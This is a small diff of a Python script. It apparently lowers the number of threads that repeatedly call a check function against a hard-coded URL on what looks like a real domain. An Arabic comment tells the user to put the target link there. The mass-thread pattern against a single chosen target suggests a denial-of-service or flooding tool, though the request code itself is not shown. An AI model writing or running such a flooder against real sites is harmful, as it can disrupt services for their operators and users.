@@ -26,7 +26,7 @@ def chek(url):
 
 def start_threads():
     target_url = "https://adminpanel.in.net/spider/"  # ضع الرابط هنا
-    for _ in range(12200):
+    for _ in range(200):
         thread = threading.Thread(target=chek, args=(target_url,))
         thread.daemon = True
         thread.start()
